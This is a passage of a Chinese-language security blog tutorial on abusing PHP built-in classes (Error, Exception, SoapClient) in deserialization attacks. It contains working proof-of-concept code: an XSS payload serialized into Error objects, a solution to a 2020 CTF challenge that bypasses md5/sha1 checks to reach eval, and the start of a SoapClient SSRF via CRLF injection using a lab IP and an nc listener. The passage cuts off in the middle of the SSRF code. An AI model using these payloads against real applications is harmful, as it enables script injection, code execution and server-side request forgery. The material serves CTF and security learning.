	<span class="token keyword">private</span> <span class="token keyword type-declaration">array</span> <span class="token variable">$trace</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>						<span class="token comment"># 数组形式的堆栈跟踪</span>
	<span class="token keyword">private</span> <span class="token operator">?</span><span class="token class-name type-declaration">Throwable</span> <span class="token variable">$previous</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>			<span class="token comment"># 之前抛出的异常</span>
    
	<span class="token comment">/* 方法 */</span>
	<span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token class-name type-declaration">Throwable</span> <span class="token variable">$previous</span> <span class="token operator">=</span> 	<span class="token constant">null</span><span class="token punctuation">)</span>	<span class="token comment"># 初始化 error 对象</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>				<span class="token comment"># 获取错误信息</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getPrevious</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">Throwable</span>			<span class="token comment"># 返回先前的 Throwable</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>						<span class="token comment"># 获取错误代码</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>					<span class="token comment"># 获取错误发生时的文件</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>						<span class="token comment"># 获取错误发生时的行号</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>					<span class="token comment"># 获取调用栈（stack trace）</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTraceAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>			<span class="token comment"># 获取字符串形式的调用栈（stack trace）</span>
	<span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># error 的字符串表达</span>
	<span class="token keyword">private</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>							<span class="token comment"># 克隆 error</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428131639833.png" class="" title="image-20220428131639833" loading="lazy">

<h2 id="Exception-类"><a href="#Exception-类" class="headerlink" title="Exception 类"></a>Exception 类</h2><p><a href="https://www.php.net/manual/zh/class.exception.php">Exception</a> 是所有用户级异常的基类，用于定义一个异常。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8 版本，且开启异常</p>
</blockquote>
<ul>
<li>摘要：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Exception</span> <span class="token keyword">implements</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">/* 属性 */</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 异常消息内容</span>
	<span class="token keyword">private</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 字符串形式的堆栈跟踪</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$code</span><span class="token punctuation">;</span>							<span class="token comment"># 异常代码</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 抛出异常的文件名</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$line</span><span class="token punctuation">;</span>							<span class="token comment"># 抛出异常在该文件中的行号</span>
	<span class="token keyword">private</span> <span class="token keyword type-declaration">array</span> <span class="token variable">$trace</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>						<span class="token comment"># 数组形式的堆栈跟踪</span>
	<span class="token keyword">private</span> <span class="token operator">?</span><span class="token class-name type-declaration">Throwable</span> <span class="token variable">$previous</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>			<span class="token comment"># 之前抛出的异常</span>
    
	<span class="token comment">/* 方法 */</span>
	<span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token class-name type-declaration">Throwable</span> <span class="token variable">$previous</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>		<span class="token comment"># 异常构造函数</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>				<span class="token comment"># 获取异常消息内容</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getPrevious</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">Throwable</span>			<span class="token comment"># 返回前一个 Throwable</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>						<span class="token comment"># 获取异常代码</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>					<span class="token comment"># 创建异常时的程序文件名称</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>						<span class="token comment"># 获取创建的异常所在文件中的行号</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>					<span class="token comment"># 获取异常追踪信息</span>
	<span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token function">getTraceAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>			<span class="token comment"># 获取字符串类型的异常追踪信息</span>
	<span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 将异常对象转换为字符串</span>
	<span class="token keyword">private</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>							<span class="token comment"># 异常克隆</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428131718630.png" class="" title="image-20220428131718630" loading="lazy">

<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>存在输出函数，且输出内容可控时，存在 xss 漏洞</p>
<ul>
<li><p>测试代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nayst'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>
</li>
<li><p>poc</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// Error</span>
<span class="token variable">$error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert('Error Test')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A36%3A%22%3Cscript%3Ealert%28%27Error+Test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CEnvironment%5Cphpstudy_pro%5CWWW%5Cpoc.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span>
<span class="token comment">// Exception</span>
<span class="token variable">$exception</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert('Exception Test')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A40%3A%22%3Cscript%3Ealert%28%27Exception+Test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CEnvironment%5Cphpstudy_pro%5CWWW%5Cpoc.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span></code></pre>
</li>
<li><p>结果</p>
<p>成功执行！</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428131037026.png" class="" title="image-20220428131037026" loading="lazy"></li>
</ul>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>在特定条件下，这两个类可以实例化两个完全相同的对象，由此绕过比较。</p>
<ul>
<li><p>测试代码（来自**[2020 极客大挑战]Greatphp**）</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># 通过 if 后可以执行代码</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span></code></pre>
</li>
<li><p>poc</p>
<p>定义两个<code>Error</code>，比较可以发现，除了行号，其他字段都相同。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428133126413.png" class="" title="image-20220428133126413" loading="lazy">

<p>那么当两个<code>Error</code>在同一行时，两者相等。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428133349028.png" class="" title="image-20220428133349028" loading="lazy">

<p>由此可以绕过哈希值检测。</p>
<p>当传入第二个参数<code>$code</code>时，不会影响内容。</p>
<p>通过控制此参数可以绕过弱比较。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428133601186.png" class="" title="image-20220428133601186" loading="lazy">

<p>综上，构造poc</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?>&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span>		<span class="token comment"># 必须先闭合，绕过前面的代码，不然会报错</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>成功执行！</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428135117579.png" class="" title="image-20220428135117579" loading="lazy">

<p><code>Exception</code> 类与 <code>Error</code> 类同理。</p>
</li>
</ul>
<h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p><a href="https://www.php.net/manual/zh/class.soapclient.php">SoapClient</a> 内置类是一个专门用来访问 web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。</p>
<p>类似 Python 中的 requests 库，可以与浏览器之间交互，并向其发送报文。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8，需要开启extension&#x3D;php_soap.dll选项</p>
</blockquote>
<p>摘要：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SoapClient</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$wsdl</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
    <span class="token keyword">public</span> <span class="token function">__doRequest</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$request</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$action</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$version</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getCookies</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span>
    <span class="token keyword">public</span> <span class="token function">__getFunctions</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastRequest</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastResponse</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getTypes</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__setCookie</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>
    <span class="token keyword">public</span> <span class="token function">__setLocation</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span> <span class="token punctuation">(</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">__soapCall</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在新建一个<code>SoapClient</code>的类对象的时候，需要有两个参数：</p>
<ul>
<li>一个是字符串形式的 <code>wsdl</code>，描述服务的 WSDL 文件的 URI，用于自动配置客户端，将该值设为 null 则表示非 wsdl 模式。（wsdl，就是一个xml格式的文档，用于描述Web Server的定义）</li>
<li>另一个是数组形式的<code>options</code>，为 SOAP 客户端指定附加选项的关联数组。如果是 wsdl 模式，这是可选的；否则，至少提供 <code>location</code> 并且 <code>uri</code> 。其中 <code>location</code> 是要将请求发送到的 SOAP 服务器的 URL ，而 <code>uri</code> 是 SOAP 服务的目标命名空间。</li>
</ul>
<p>此类中存在<code>__call</code>函数，用于调用 SOAP 函数。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>由于 <code>$options</code> 中的字段可控，利用 CRLF 恶意注入一些参数。</p>
<ul>
<li><p>测试代码</p>
<p>在靶机上监听端口，接数据</p>
<pre class="language-php" data-language="php"><code class="language-php">$ nc <span class="token operator">-</span>lvnp <span class="token number">1234</span></code></pre>

<p>看看原始数据是什么样的</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://192.168.254.128:1234"</span><span class="token punctuation">;</span>
	<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location"</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uri"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$do</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$do</span> <span class="token operator">-></span> <span class="token function">nayst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428221703863.png" class="" title="image-20220428221703863" loading="lazy">

<p>尝试修改 ua 并插入 Cookie</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://192.168.254.128:1234"</span><span class="token punctuation">;</span>
